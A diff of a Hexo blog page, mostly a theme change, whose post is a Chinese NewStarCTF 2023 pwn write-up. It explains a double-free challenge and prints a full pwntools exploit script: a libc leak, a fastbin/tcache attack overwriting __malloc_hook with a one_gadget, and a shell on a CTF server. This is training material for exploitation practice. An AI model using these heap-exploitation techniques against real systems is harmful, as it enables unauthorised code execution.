@@ -1,12 +1,25 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta charset="utf-8">
-  
-  
-  <title>newstarctf | Hexo</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="newstartctf2023_week4 pwnDouble堆heap, double_free, fastbin libc: 2.23 程序中功能选择只有创建add()，删除del()和检查check()。其中，check()内存在后门函数，只要0x602070处的值为1638，即可直接getsshell。 其次，del()中释放块后没有清除指针，可以进行double free。因此只要在0x">
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha256-CTSx/A06dm1B063156EVh15m6Y67pAjZZaQc89LLSrU=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.18.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="newstartctf2023_week4 pwnDouble堆heap, double_free, fastbin libc: 2.23 程序中功能选择只有创建add()，删除del()和检查check()。其中，check()内存在后门函数，只要0x602070处的值为1638，即可直接getsshell。 其次，del()中释放块后没有清除指针，可以进行double free。因此只要在0x">
 <meta property="og:type" content="article">
 <meta property="og:title" content="newstarctf">
 <meta property="og:url" content="http://example.com/2023/10/20/newstarctf/index.html">
@@ -35,91 +48,177 @@
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/image-20231019173000077.png">
-  
-    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
-  
-  
-    <link rel="shortcut icon" href="/favicon.png">
-  
-  
-    
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
 
-  
-  
-<link rel="stylesheet" href="/css/style.css">
 
-  
-    
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+<link rel="canonical" href="http://example.com/2023/10/20/newstarctf/">
 
-  
-  
-<meta name="generator" content="Hexo 6.3.0"></head>
 
-<body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">Hexo</a>
-      </h1>
-      
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2023/10/20/newstarctf/","path":"2023/10/20/newstarctf/","title":"newstarctf"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>newstarctf | Hexo</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
     </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Hexo</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+</header>
         
-          <a class="main-nav-link" href="/">Home</a>
-        
-          <a class="main-nav-link" href="/archives">Archives</a>
-        
-      </nav>
-      <nav id="sub-nav">
-        
-        
-          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
-        
-        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#newstartctf2023-week4-pwn"><span class="nav-number">1.</span> <span class="nav-text">newstartctf2023_week4 pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Double"><span class="nav-number">1.1.</span> <span class="nav-text">Double</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A4"><span class="nav-number">1.1.1.</span> <span class="nav-text">步骤</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#game"><span class="nav-number">1.2.</span> <span class="nav-text">game</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A8%8B%E5%BA%8F%E6%B5%81%E7%A8%8B"><span class="nav-number">1.2.1.</span> <span class="nav-text">程序流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.2.2.</span> <span class="nav-text">漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AE%A1%E7%AE%97%E5%81%8F%E7%A7%BB"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">计算偏移</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#message-board"><span class="nav-number">1.3.</span> <span class="nav-text">message board</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%84%E9%9C%B2%E5%9C%B0%E5%9D%80"><span class="nav-number">1.3.1.</span> <span class="nav-text">泄露地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AE%A1%E7%AE%97%E4%B8%8B%E6%A0%87"><span class="nav-number">1.3.2.</span> <span class="nav-text">计算下标</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#one-gadget%E8%8E%B7%E5%8F%96"><span class="nav-number">1.3.3.</span> <span class="nav-text">one_gadget获取</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezheap"><span class="nav-number">1.4.</span> <span class="nav-text">ezheap</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="nav-number">1.4.1.</span> <span class="nav-text">程序分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#add%E5%87%BD%E6%95%B0"><span class="nav-number">1.4.1.1.</span> <span class="nav-text">add函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#delete%E5%87%BD%E6%95%B0"><span class="nav-number">1.4.1.2.</span> <span class="nav-text">delete函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#show%E5%87%BD%E6%95%B0"><span class="nav-number">1.4.1.3.</span> <span class="nav-text">show函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#edit%E5%87%BD%E6%95%B0"><span class="nav-number">1.4.1.4.</span> <span class="nav-text">edit函数</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">1.4.2.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E8%AF%BB%E5%86%99"><span class="nav-number">1.4.2.1.</span> <span class="nav-text">任意地址读写</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B3%84%E9%9C%B2libc%E5%9C%B0%E5%9D%80"><span class="nav-number">1.4.2.2.</span> <span class="nav-text">泄露libc地址</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A4-1"><span class="nav-number">1.4.3.</span> <span class="nav-text">步骤</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#god-of-change"><span class="nav-number">1.5.</span> <span class="nav-text">god of change</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90-1"><span class="nav-number">1.5.1.</span> <span class="nav-text">程序分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%9B%E5%BB%BA%E5%87%BD%E6%95%B0"><span class="nav-number">1.5.1.1.</span> <span class="nav-text">创建函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%87%8A%E6%94%BE%E5%87%BD%E6%95%B0"><span class="nav-number">1.5.1.2.</span> <span class="nav-text">释放函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%98%BE%E7%A4%BA%E5%87%BD%E6%95%B0"><span class="nav-number">1.5.1.3.</span> <span class="nav-text">显示函数</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-1"><span class="nav-number">1.5.2.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A4-2"><span class="nav-number">1.5.3.</span> <span class="nav-text">步骤</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B3%84%E9%9C%B2libc%E5%9C%B0%E5%9D%80-1"><span class="nav-number">1.5.3.1.</span> <span class="nav-text">泄露libc地址</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9E%84%E9%80%A0fake-chunk"><span class="nav-number">1.5.3.2.</span> <span class="nav-text">构造fake chunk</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%B0%83%E7%94%A8one-gadget"><span class="nav-number">1.5.3.3.</span> <span class="nav-text">调用one_gadget</span></a></li></ol></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">2</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">categories</span>
+      </div>
+  </nav>
+</div>
+
+        </div>
       </div>
     </div>
-  </div>
-</header>
 
-      <div class="outer">
-        <section id="main"><article id="post-newstarctf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2023/10/20/newstarctf/" class="article-date">
-  <time class="dt-published" datetime="2023-10-19T17:20:21.000Z" itemprop="datePublished">2023-10-20</time>
-</a>
     
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/writeup/">writeup</a>
-  </div>
+  </aside>
 
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="p-name article-title" itemprop="headline name">
-      newstarctf
-    </h1>
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
   
 
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/20/newstarctf/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="newstarctf | Hexo">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          newstarctf
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
       
-        <h1 id="newstartctf2023-week4-pwn"><a href="#newstartctf2023-week4-pwn" class="headerlink" title="newstartctf2023_week4 pwn"></a>newstartctf2023_week4 pwn</h1><h2 id="Double"><a href="#Double" class="headerlink" title="Double"></a>Double</h2><p>堆heap, double_free, fastbin</p>
+
+      <time title="Created: 2023-10-20 01:20:21 / Modified: 01:22:51" itemprop="dateCreated datePublished" datetime="2023-10-20T01:20:21+08:00">2023-10-20</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/writeup/" itemprop="url" rel="index"><span itemprop="name">writeup</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="newstartctf2023-week4-pwn"><a href="#newstartctf2023-week4-pwn" class="headerlink" title="newstartctf2023_week4 pwn"></a>newstartctf2023_week4 pwn</h1><h2 id="Double"><a href="#Double" class="headerlink" title="Double"></a>Double</h2><p>堆heap, double_free, fastbin</p>
 <p>libc: 2.23</p>
 <p>程序中功能选择只有创建<code>add()</code>，删除<code>del()</code>和检查<code>check()</code>。其中，<code>check()</code>内存在后门函数，只要0x602070处的值为1638，即可直接getsshell。</p>
 <p>其次，<code>del()</code>中释放块后没有清除指针，可以进行double free。因此只要在0x602070处伪造块，并设置值为1638。</p>
@@ -233,120 +332,87 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">isremote = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">len</span>(sys.argv)&gt;<span class="number">1</span> <span class="keyword">and</span> <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])==<span class="number">1</span>):</span><br><span class="line">    p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28449</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">    isremote = <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=process(<span class="string">&#x27;./pwn_pe&#x27;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p, &#x27;b *$rebase(0x1592)&#x27;)</span></span><br><span class="line">    libc=ELF(<span class="string">&#x27;/glibc-all-in-one/2.31-0ubuntu9.7_amd64/libc.so.6&#x27;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p, &#x27;b malloc&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choose</span>(<span class="params">x</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Your Choice: &#x27;</span>)</span><br><span class="line">    p.send(<span class="built_in">str</span>(x).encode())</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mal</span>(<span class="params">content, size=<span class="number">0x18</span></span>):</span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;size: \n&#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;the content: \n&#x27;</span>, content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    choose(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;idx: \n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    <span class="keyword">assert</span> <span class="keyword">not</span> <span class="string">b&#x27;forbidden&#x27;</span> <span class="keyword">in</span> p.recvuntil(<span class="string">b&#x27;1.Create Slot&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printcont</span>(<span class="params">index</span>):</span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;idx: \n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line">mal(<span class="string">b&#x27;aa&#x27;</span>)</span><br><span class="line">mal(<span class="string">b&#x27;aa&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">mal(<span class="string">b&#x27;aa&#x27;</span>) <span class="comment">#2</span></span><br><span class="line">mal(<span class="string">b&#x27;aa60&#x27;</span>, <span class="number">0x48</span>) <span class="comment">#3</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x460</span>//<span class="number">0x70</span> -<span class="number">1</span>):    <span class="comment">#4 - 12</span></span><br><span class="line">    mal(<span class="string">b&#x27;aa70&#x27;</span>+<span class="built_in">str</span>(i).encode(), <span class="number">0x68</span>)</span><br><span class="line">mal(<span class="string">b&#x27;aa&#x27;</span>)<span class="comment">#13</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">mal(<span class="string">b&#x27;/bin/sh\0&#x27;</span>.ljust(<span class="number">0x18</span>, <span class="string">b&#x27;a&#x27;</span>)+<span class="string">b&#x27;\x81&#x27;</span>) <span class="comment">#14-0</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">mal(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x461</span>), <span class="number">0x78</span>) <span class="comment">#15-1</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">mal(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x1f</span> + <span class="string">b&#x27;b&#x27;</span>,<span class="number">0x78</span>) <span class="comment">#16-1</span></span><br><span class="line">printcont(<span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;ab&#x27;</span>)</span><br><span class="line">mainarena_96 = u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>)) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libcbase = mainarena_96 - <span class="number">0x1ecbe0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;the libcbase is : <span class="subst">&#123;libcbase:#x&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> isremote == <span class="number">1</span>:</span><br><span class="line">    onegadget = libcbase + <span class="number">0xe3b01</span> </span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    onegadget = libcbase + <span class="number">0xe3b31</span></span><br><span class="line">freehook = libcbase + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]   </span><br><span class="line">mallochook = libcbase + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;the freehook is : <span class="subst">&#123;freehook:#x&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;the malloc_hook is : <span class="subst">&#123;mallochook:#x&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;the one_gadget is : <span class="subst">&#123;onegadget:#x&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fakechunk0 = mallochook - <span class="number">0x30</span> - <span class="number">3</span></span><br><span class="line">payload0 = <span class="string">b&#x27;\0&#x27;</span> * (<span class="number">0x3</span> + <span class="number">0x20</span>)  + p64(onegadget)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>,<span class="number">11</span>):   <span class="comment">#4-10 7-&gt;tcache 0x7</span></span><br><span class="line">    free(i)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">mal(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x71</span>), <span class="number">0x78</span>)  <span class="comment">#18-1</span></span><br><span class="line">free(<span class="number">2</span>) <span class="comment">#fastbin -&gt; 2</span></span><br><span class="line">free(<span class="number">1</span>) </span><br><span class="line">mal(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x71</span>)+p64(fakechunk0), <span class="number">0x78</span>)  <span class="comment">#19-1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>): </span><br><span class="line">    mal(<span class="string">b&#x27;cc70&#x27;</span>+<span class="built_in">str</span>(i).encode(), <span class="number">0x68</span>)</span><br><span class="line"><span class="comment"># tcache -&gt; 2 -&gt; fake</span></span><br><span class="line">mal(<span class="string">b&#x27;cc&#x27;</span>, <span class="number">0x68</span>)   <span class="comment">#from fastbin    #2</span></span><br><span class="line">mal(payload0, <span class="number">0x68</span>)  </span><br><span class="line"></span><br><span class="line">choose(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;size: \n&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 
-      
     </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2023/10/20/newstarctf/" data-id="clnxg8h2h0000nwsh5dij6j3k" data-title="newstarctf" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/10/19/hello-world/" rel="prev" title="Hello World">
+                  <i class="fa fa-angle-left"></i> Hello World
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
     </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2023</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">John Doe</span>
   </div>
-  
-    
-<nav id="article-nav">
-  
-  
-    <a href="/2023/10/19/hello-world/" id="article-nav-older" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">Hello World</div>
-    </a>
-  
-</nav>
-
-  
-</article>
-
-
-</section>
-        
-          <aside id="sidebar">
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Categories</h3>
-    <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/writeup/">writeup</a></li></ul>
-    </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
   </div>
-
-
-  
-    
-
-  
-    
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/10/">October 2023</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
-    <div class="widget">
-      <ul>
-        
-          <li>
-            <a href="/2023/10/20/newstarctf/">newstarctf</a>
-          </li>
-        
-          <li>
-            <a href="/2023/10/19/hello-world/">Hello World</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-
-  
-</aside>
-        
-      </div>
-      <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
-      
-      &copy; 2023 John Doe<br>
-      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
-    </div>
-  </div>
-</footer>
 
     </div>
-    <nav id="mobile-nav">
-  
-    <a href="/" class="mobile-nav-link">Home</a>
-  
-    <a href="/archives" class="mobile-nav-link">Archives</a>
-  
-</nav>
-    
-
-
-<script src="/js/jquery-3.6.4.min.js"></script>
-
-
+  </footer>
 
   
-<script src="/fancybox/jquery.fancybox.min.js"></script>
-
-
-
-
-<script src="/js/script.js"></script>
-
-
-
-
-
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
   </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
 </body>
 </html>
